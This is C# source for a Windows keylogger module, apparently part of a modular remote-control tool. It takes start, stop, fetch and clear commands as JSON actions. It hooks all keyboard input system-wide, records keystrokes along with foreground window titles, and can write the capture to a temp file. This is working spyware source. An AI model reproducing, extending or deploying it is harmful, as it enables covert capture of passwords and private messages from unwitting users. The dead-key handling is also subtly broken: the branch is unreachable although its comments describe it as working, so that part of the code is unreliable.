using System;
using System.Collections.Concurrent;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace mullvad.Module.Keylogger
{
    public sealed class KeyloggerModule
    {
        public static string ModuleId => "mullvad.keylogger";

        // ── Win32 ─────────────────────────────────────────────────────────────

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN     = 0x0100;
        private const int WM_SYSKEYDOWN  = 0x0104;
        private const int WM_QUIT        = 0x0012;
        private const int HC_ACTION      = 0;

        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public uint vkCode, scanCode, flags, time;
            public IntPtr dwExtraInfo;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MSG
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam, lParam;
            public uint time;
            public int ptX, ptY;
        }

        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int id, HookProc fn, IntPtr hmod, uint tid);
        [DllImport("user32.dll")] private static extern bool   UnhookWindowsHookEx(IntPtr h);
        [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr wp, IntPtr lp);
        [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] private static extern int    GetWindowText(IntPtr h, StringBuilder s, int n);
        [DllImport("user32.dll")] private static extern bool   GetKeyboardState(byte[] buf);
        [DllImport("user32.dll")] private static extern int    ToUnicodeEx(uint vk, uint scan, byte[] kb, StringBuilder buf, int sz, uint flags, IntPtr hkl);
        [DllImport("user32.dll")] private static extern IntPtr GetKeyboardLayout(uint tid);
        [DllImport("user32.dll")] private static extern uint   GetWindowThreadProcessId(IntPtr h, IntPtr pid);
        [DllImport("user32.dll")] private static extern bool   PostThreadMessage(uint tid, uint msg, IntPtr wp, IntPtr lp);
        [DllImport("user32.dll")] private static extern int    GetMessage(out MSG m, IntPtr h, uint lo, uint hi);
        [DllImport("user32.dll")] private static extern bool   TranslateMessage(ref MSG m);
        [DllImport("user32.dll")] private static extern IntPtr DispatchMessage(ref MSG m);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] private static extern IntPtr GetModuleHandle(string? n);
        [DllImport("kernel32.dll")] private static extern uint  GetCurrentThreadId();

        // ── State ─────────────────────────────────────────────────────────────

        private static readonly object       _lock     = new object();
        private static volatile bool          _active   = false;
        private static Thread?                _thread;
        private static uint                   _threadId;
        private static IntPtr                 _hook     = IntPtr.Zero;
        private static HookProc?              _proc;
        private static readonly StringBuilder _log      = new StringBuilder();
        private static IntPtr                 _lastHwnd = IntPtr.Zero;
        private static string?                _diskPath;

        // Disk writes are queued and flushed off the hook thread to keep the callback fast
        private static readonly ConcurrentQueue<string> _diskQueue = new ConcurrentQueue<string>();
        private static Thread?  _diskThread;
        private static volatile bool _diskRunning;

        // ── Module entry ──────────────────────────────────────────────────────

        public string Execute(string action, string payload)
        {
            try
            {
                switch (action)
                {
                    case "start":  return Start(payload);
                    case "stop":   return StopAndFetch();
                    case "fetch":  return Fetch();
                    case "clear":  return Clear();
                    case "status": return Status();
                    default:       return Err("unknown: " + action);
                }
            }
            catch (Exception ex) { return Err(ex.Message); }
        }

        // ── Actions ───────────────────────────────────────────────────────────

        private static string Start(string payload)
        {
            if (_active) return OkJson("already_active", true);

            _diskPath = null;
            if (payload != null && payload.IndexOf("\"disk\"", StringComparison.Ordinal) >= 0)
            {
                string path = Path.Combine(Path.GetTempPath(), "kl.log");
                int pi = payload.IndexOf("\"path\"", StringComparison.Ordinal);
                if (pi >= 0)
                {
                    int q1 = payload.IndexOf('"', pi + 7);
                    if (q1 >= 0)
                    {
                        int q2 = payload.IndexOf('"', q1 + 1);
                        if (q2 > q1) path = payload.Substring(q1 + 1, q2 - q1 - 1);
                    }
                }
                _diskPath = path;
                StartDiskFlusher();
            }

            lock (_lock)
            {
                _log.Clear();
                _lastHwnd = IntPtr.Zero;
            }

            var ready = new ManualResetEventSlim(false);
            _proc = HookCallback;

            _thread = new Thread(() =>
            {
                _threadId = GetCurrentThreadId();
                // hMod must be non-null for global LL hooks — use the host EXE module handle
                _hook   = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(null), 0);
                _active = _hook != IntPtr.Zero;
                ready.Set();

                if (_hook == IntPtr.Zero) return;

                MSG msg;
                // Pump messages — must not block; any slow work would delay CallNextHookEx
                // and cause Windows to stop calling the hook (LowLevelHooksTimeout ~300ms).
                while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0)
                {
                    TranslateMessage(ref msg);
                    DispatchMessage(ref msg);
                }

                UnhookWindowsHookEx(_hook);
                _hook   = IntPtr.Zero;
                _active = false;
            });
            _thread.SetApartmentState(ApartmentState.STA);
            _thread.IsBackground = true;
            _thread.Start();
            ready.Wait(3000);

            return OkJson(_active ? "started" : "hook_failed", _active);
        }

        private static string StopAndFetch()
        {
            if (_active)
            {
                PostThreadMessage(_threadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero);
                _thread?.Join(3000);
            }
            _diskRunning = false;
            _diskThread?.Join(1000);

            string log;
            lock (_lock)
            {
                log = _log.ToString();
                _log.Clear();
            }
            return LogJson(false, log);
        }

        private static string Fetch()
        {
            string log;
            lock (_lock) { log = _log.ToString(); }
            return LogJson(_active, log);
        }

        private static string Clear()
        {
            lock (_lock) { _log.Clear(); }
            return OkJson("cleared", _active);
        }

        private static string Status()
            => "{\"active\":" + (_active ? "true" : "false") + "}";

        // ── Hook callback — MUST return quickly, no blocking I/O ──────────────

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode == HC_ACTION &&
                ((int)wParam == WM_KEYDOWN || (int)wParam == WM_SYSKEYDOWN))
            {
                KBDLLHOOKSTRUCT s;
                try { s = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT)); }
                catch { return CallNextHookEx(_hook, nCode, wParam, lParam); }

                // Window title on focus change
                IntPtr hwnd = GetForegroundWindow();
                if (hwnd != _lastHwnd)
                {
                    var titleBuf = new StringBuilder(256);
                    GetWindowText(hwnd, titleBuf, 256);
                    Emit("\r\n[" + titleBuf + "]\r\n");
                    _lastHwnd = hwnd;
                }

                // GetKeyboardState from within a WH_KEYBOARD_LL callback reflects the
                // actual current keyboard state (system updates it before invoking the hook).
                // This is correct — do NOT use GetAsyncKeyState here, it has race conditions
                // when typing fast.
                var keyState = new byte[256];
                GetKeyboardState(keyState);

                uint tid   = GetWindowThreadProcessId(hwnd, IntPtr.Zero);
                IntPtr hkl = GetKeyboardLayout(tid);
                if (hkl == IntPtr.Zero) hkl = GetKeyboardLayout(0);

                var charBuf = new StringBuilder(8);
                int res = ToUnicodeEx(s.vkCode, s.scanCode, keyState, charBuf, 8, 0, hkl);
                if (res > 0)
                {
                    // Filter dead-key state: res == -1 means a dead key was stored in the
                    // system's internal buffer. Calling ToUnicodeEx again with a space flushes it
                    // so subsequent characters resolve correctly.
                    if (res == -1)
                    {
                        // flush the dead key buffer to keep state clean
                        var flush = new StringBuilder(8);
                        ToUnicodeEx(0x20, 0x39, keyState, flush, 8, 0, hkl);
                        Emit("[`]");
                    }
                    else
                    {
                        Emit(charBuf.ToString());
                    }
                }
                else
                {
                    string? special = SpecialKey(s.vkCode);
                    if (special != null) Emit(special);
                }
            }
            return CallNextHookEx(_hook, nCode, wParam, lParam);
        }

        // Emit stays off the hot path: in-memory append is fast; disk write is queued.
        private static void Emit(string text)
        {
            lock (_lock) { _log.Append(text); }
            if (_diskPath != null) _diskQueue.Enqueue(text);
        }

        // ── Disk flusher — runs on its own thread so I/O never touches the hook pump ──

        private static void StartDiskFlusher()
        {
            _diskRunning = true;
            _diskThread  = new Thread(() =>
            {
                while (_diskRunning || !_diskQueue.IsEmpty)
                {
                    var sb = new StringBuilder();
                    while (_diskQueue.TryDequeue(out string? chunk))
                        sb.Append(chunk);

                    if (sb.Length > 0 && _diskPath != null)
                    {
                        try { File.AppendAllText(_diskPath, sb.ToString(), Encoding.UTF8); } catch { }
                    }
                    Thread.Sleep(250);
                }
            });
            _diskThread.IsBackground = true;
            _diskThread.Start();
        }

        // ── Special keys ──────────────────────────────────────────────────────

        private static string? SpecialKey(uint vk)
        {
            switch (vk)
            {
                case 0x08: return "[Back]";
                case 0x09: return "[Tab]";
                case 0x0D: return "[Enter]\r\n";
                case 0x1B: return "[Esc]";
                case 0x20: return " ";
                case 0x2D: return "[Ins]";
                case 0x2E: return "[Del]";
                case 0x23: return "[End]";
                case 0x24: return "[Home]";
                case 0x21: return "[PgUp]";
                case 0x22: return "[PgDn]";
                case 0x25: return "[←]";
                case 0x26: return "[↑]";
                case 0x27: return "[→]";
                case 0x28: return "[↓]";
                case 0x5B: return "[Win]";
                case 0x5C: return "[Win]";
                case 0x70: return "[F1]";
                case 0x71: return "[F2]";
                case 0x72: return "[F3]";
                case 0x73: return "[F4]";
                case 0x74: return "[F5]";
                case 0x75: return "[F6]";
                case 0x76: return "[F7]";
                case 0x77: return "[F8]";
                case 0x78: return "[F9]";
                case 0x79: return "[F10]";
                case 0x7A: return "[F11]";
                case 0x7B: return "[F12]";
                default:   return null;
            }
        }

        // ── JSON helpers ──────────────────────────────────────────────────────

        private static string OkJson(string msg, bool active)
            => "{\"ok\":true,\"msg\":" + Js(msg) + ",\"active\":" + (active ? "true" : "false") + "}";

        private static string LogJson(bool active, string log)
            => "{\"active\":" + (active ? "true" : "false") +
               ",\"log\":" + Js(log) +
               ",\"chars\":" + log.Length + "}";

        private static string Err(string msg) => "{\"error\":" + Js(msg) + "}";

        private static string Js(string s)
            => "\"" + s.Replace("\\", "\\\\").Replace("\"", "\\\"")
                       .Replace("\r", "\\r").Replace("\n", "\\n") + "\"";
    }
}
